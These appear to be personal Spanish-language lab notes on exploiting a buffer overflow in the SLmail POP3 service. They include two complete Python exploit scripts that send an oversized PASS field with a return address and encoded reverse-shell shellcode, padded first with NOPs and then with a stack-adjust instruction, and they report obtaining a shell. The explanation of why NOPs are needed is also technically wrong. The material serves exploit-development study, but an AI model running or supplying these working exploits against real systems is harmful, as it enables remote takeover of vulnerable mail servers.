Ya hemos hecho que el EIP apunte al comienzo de la pila entonces ahora vamos a probar si el shellcode se interpreta y nos da una reverse shell entonces para esto reinicmiamos el servicio de slmail para despues ponernos en escucha en nuestra maquina atacante desde el puerto especificado


![[Pasted image 20240310074524.png]]

Ya estando en escucha ahora lo que sigue es ejecutar el exploit y si todo sale bien nos tendria que dar una shell 


![[Pasted image 20240310074711.png]]

Al ejeuctarlo no parece que nos haya dado una revershell 


![[Pasted image 20240310074907.png]]

BUeno esto no se interpreta ya que el shellcode al ser amplio y ciertamente complejo su ejecucuion puede requerir mas tiempo la que el procesador tiene disponilbe antes de que continue con la siguiente instruccion del programa por tanto lo que se suele hacer es asignarle un espacio como de descanso y con este espacio asignado ya hay tiempo suficiente del lado del procesador para que luego sea capaz de interpretar estas instrucciones para ello se suelen usar NOPs  los cuales no tienen ninguna operacion por lo que podemos asignar un par de NOPs los cuales se representan como x90 y bueno tu puedes meter un conjunto grande de NOPs antes de meter el shellcode de forma de que hay un espacio en el que no se hace nada por lo que le das tiempo al procesador de que interprete este shellcode esta es una forma otra puede ser desplazando la pila bueno entonces para que se interprete el shellcode lo que podemos hacer es meter algunos NOPs antes del shellcode por lo tanto podemos modificar el exploit de la siguiente manera


```python
#!/usr/bin/python3.11
from struct import pack

import sys
import socket

ip = "192.168.0.2"
port = 110


offset=4655

before_eip=b"A"*offset

eip=pack("<L",0x5f4c4d13)

shellcode=(b"\xdb\xc2\xbe\xa1\x84\x28\xe1\xd9\x74\x24\xf4\x5a\x2b\xc9"
b"\xb1\x52\x83\xea\xfc\x31\x72\x13\x03\xd3\x97\xca\x14\xef"
b"\x70\x88\xd7\x0f\x81\xed\x5e\xea\xb0\x2d\x04\x7f\xe2\x9d"
b"\x4e\x2d\x0f\x55\x02\xc5\x84\x1b\x8b\xea\x2d\x91\xed\xc5"
b"\xae\x8a\xce\x44\x2d\xd1\x02\xa6\x0c\x1a\x57\xa7\x49\x47"
b"\x9a\xf5\x02\x03\x09\xe9\x27\x59\x92\x82\x74\x4f\x92\x77"
b"\xcc\x6e\xb3\x26\x46\x29\x13\xc9\x8b\x41\x1a\xd1\xc8\x6c"
b"\xd4\x6a\x3a\x1a\xe7\xba\x72\xe3\x44\x83\xba\x16\x94\xc4"
b"\x7d\xc9\xe3\x3c\x7e\x74\xf4\xfb\xfc\xa2\x71\x1f\xa6\x21"
b"\x21\xfb\x56\xe5\xb4\x88\x55\x42\xb2\xd6\x79\x55\x17\x6d"
b"\x85\xde\x96\xa1\x0f\xa4\xbc\x65\x4b\x7e\xdc\x3c\x31\xd1"
b"\xe1\x5e\x9a\x8e\x47\x15\x37\xda\xf5\x74\x50\x2f\x34\x86"
b"\xa0\x27\x4f\xf5\x92\xe8\xfb\x91\x9e\x61\x22\x66\xe0\x5b"
b"\x92\xf8\x1f\x64\xe3\xd1\xdb\x30\xb3\x49\xcd\x38\x58\x89"
b"\xf2\xec\xcf\xd9\x5c\x5f\xb0\x89\x1c\x0f\x58\xc3\x92\x70"
b"\x78\xec\x78\x19\x13\x17\xeb\xe6\x4c\x17\x6b\x8e\x8e\x17"
b"\x6a\xf4\x06\xf1\x06\x1a\x4f\xaa\xbe\x83\xca\x20\x5e\x4b"
b"\xc1\x4d\x60\xc7\xe6\xb2\x2f\x20\x82\xa0\xd8\xc0\xd9\x9a"
b"\x4f\xde\xf7\xb2\x0c\x4d\x9c\x42\x5a\x6e\x0b\x15\x0b\x40"
b"\x42\xf3\xa1\xfb\xfc\xe1\x3b\x9d\xc7\xa1\xe7\x5e\xc9\x28"
b"\x65\xda\xed\x3a\xb3\xe3\xa9\x6e\x6b\xb2\x67\xd8\xcd\x6c"
b"\xc6\xb2\x87\xc3\x80\x52\x51\x28\x13\x24\x5e\x65\xe5\xc8"
b"\xef\xd0\xb0\xf7\xc0\xb4\x34\x80\x3c\x25\xba\x5b\x85\x45"
b"\x59\x49\xf0\xed\xc4\x18\xb9\x73\xf7\xf7\xfe\x8d\x74\xfd"
b"\x7e\x6a\x64\x74\x7a\x36\x22\x65\xf6\x27\xc7\x89\xa5\x48"
b"\xc2")
payload=before_eip+eip+b"\x90"*16+shellcode 

def exploit():

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.connect((ip, port))

    banner = s.recv(1024)

    s.send(b"USER tumbaburras" + b'\r\n')
    response = s.recv(1024)

    s.send(b"PASS" + payload + b'\r\n')


    s.close

if __name__ == '__main__':

    exploit()




```


Entonces ahora si nuevamente reinicamos el servicio de SLmail para despues ponernos en escucha desde la maquina atacante

![[Pasted image 20240310080840.png]]

Seguidamente ejecutamos el exploit y si todo sale bien nos tendira que dar nuestra reverse shell

![[Pasted image 20240310082957.png]]

Y listo ya nos ha dado nuestra shell

![[Pasted image 20240310081029.png]]

BUeno si no quieres utilizar NOPs algo que puedes hacer es aplicar un desplazamiento de la pila para que tarde un poco mas en llegar al shellcode y una vez llegue pueda lograr interpretar el shellcode entonces como se puede hacer esto primero tienes que utilizar la siguiente herramienta la cual la utilizamos anteriormente

![[Pasted image 20240310081514.png]]

Ahora la ejecutamos e ingresamos la siguiente instruccion 

![[Pasted image 20240310081745.png]]

Lo que estamos haciendo es decrementar el valor del puntero de pila 16 bytes entonces nos copiamos la siguiente instruccion 

![[Pasted image 20240310082150.png]]

Y ahora si eliminamos los NOPs y colocamos esta instruccion antes del shellcode como un operation code como se muestra a continuacion 


```python
#!/usr/bin/python3.11
from struct import pack

import sys
import socket

ip = "192.168.0.2"
port = 110


offset=4655

before_eip=b"A"*offset

eip=pack("<L",0x5f4c4d13)

shellcode=(b"\xdb\xc2\xbe\xa1\x84\x28\xe1\xd9\x74\x24\xf4\x5a\x2b\xc9"
b"\xb1\x52\x83\xea\xfc\x31\x72\x13\x03\xd3\x97\xca\x14\xef"
b"\x70\x88\xd7\x0f\x81\xed\x5e\xea\xb0\x2d\x04\x7f\xe2\x9d"
b"\x4e\x2d\x0f\x55\x02\xc5\x84\x1b\x8b\xea\x2d\x91\xed\xc5"
b"\xae\x8a\xce\x44\x2d\xd1\x02\xa6\x0c\x1a\x57\xa7\x49\x47"
b"\x9a\xf5\x02\x03\x09\xe9\x27\x59\x92\x82\x74\x4f\x92\x77"
b"\xcc\x6e\xb3\x26\x46\x29\x13\xc9\x8b\x41\x1a\xd1\xc8\x6c"
b"\xd4\x6a\x3a\x1a\xe7\xba\x72\xe3\x44\x83\xba\x16\x94\xc4"
b"\x7d\xc9\xe3\x3c\x7e\x74\xf4\xfb\xfc\xa2\x71\x1f\xa6\x21"
b"\x21\xfb\x56\xe5\xb4\x88\x55\x42\xb2\xd6\x79\x55\x17\x6d"
b"\x85\xde\x96\xa1\x0f\xa4\xbc\x65\x4b\x7e\xdc\x3c\x31\xd1"
b"\xe1\x5e\x9a\x8e\x47\x15\x37\xda\xf5\x74\x50\x2f\x34\x86"
b"\xa0\x27\x4f\xf5\x92\xe8\xfb\x91\x9e\x61\x22\x66\xe0\x5b"
b"\x92\xf8\x1f\x64\xe3\xd1\xdb\x30\xb3\x49\xcd\x38\x58\x89"
b"\xf2\xec\xcf\xd9\x5c\x5f\xb0\x89\x1c\x0f\x58\xc3\x92\x70"
b"\x78\xec\x78\x19\x13\x17\xeb\xe6\x4c\x17\x6b\x8e\x8e\x17"
b"\x6a\xf4\x06\xf1\x06\x1a\x4f\xaa\xbe\x83\xca\x20\x5e\x4b"
b"\xc1\x4d\x60\xc7\xe6\xb2\x2f\x20\x82\xa0\xd8\xc0\xd9\x9a"
b"\x4f\xde\xf7\xb2\x0c\x4d\x9c\x42\x5a\x6e\x0b\x15\x0b\x40"
b"\x42\xf3\xa1\xfb\xfc\xe1\x3b\x9d\xc7\xa1\xe7\x5e\xc9\x28"
b"\x65\xda\xed\x3a\xb3\xe3\xa9\x6e\x6b\xb2\x67\xd8\xcd\x6c"
b"\xc6\xb2\x87\xc3\x80\x52\x51\x28\x13\x24\x5e\x65\xe5\xc8"
b"\xef\xd0\xb0\xf7\xc0\xb4\x34\x80\x3c\x25\xba\x5b\x85\x45"
b"\x59\x49\xf0\xed\xc4\x18\xb9\x73\xf7\xf7\xfe\x8d\x74\xfd"
b"\x7e\x6a\x64\x74\x7a\x36\x22\x65\xf6\x27\xc7\x89\xa5\x48"
b"\xc2")
payload=before_eip+eip+b"\x83\xEC\x10"+shellcode 

def exploit():

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.connect((ip, port))

    banner = s.recv(1024)

    s.send(b"USER tumbaburras" + b'\r\n')
    response = s.recv(1024)

    s.send(b"PASS" + payload + b'\r\n')


    s.close

if __name__ == '__main__':

    exploit()




```

Entonces ahora reiniciamos nuevamente el servicio de SLmail y despues nos ponemos en escucha en nuestra maquina atacante

![[Pasted image 20240310083058.png]]

Finalmente ejecutamos el exploit 

![[Pasted image 20240310083312.png]]

Y listo ahora podemos ver que nos ha dado una reverse shell 


![[Pasted image 20240310083339.png]]

Esta ha sido otra forma de darle espacio al shellcode para su correcta interpretacion 


